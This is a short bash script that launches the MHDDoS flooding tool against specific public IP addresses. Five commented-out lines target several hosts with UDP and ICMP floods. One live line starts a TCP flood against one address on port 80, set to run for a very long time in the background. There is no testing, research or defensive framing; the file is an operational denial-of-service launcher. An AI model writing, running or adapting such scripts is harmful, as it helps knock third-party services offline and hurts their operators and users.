#!/bin/bash

# python3 MHDDoS/start.py UDP 110.42.35.240:80 1 99999999 true &
# python3 MHDDoS/start.py UDP 154.9.249.129:80 1 99999999 true &
# python3 MHDDoS/start.py ICMP 153.121.71.128:80 1 99999999 true &
# python3 MHDDoS/start.py UDP 45.154.15.226:80 1 99999999 true
# python3 MHDDoS/start.py UDP 193.32.149.118:80 1 99999999 true &
python3 MHDDoS/start.py TCP 156.238.250.25:80 1 99999999 true &
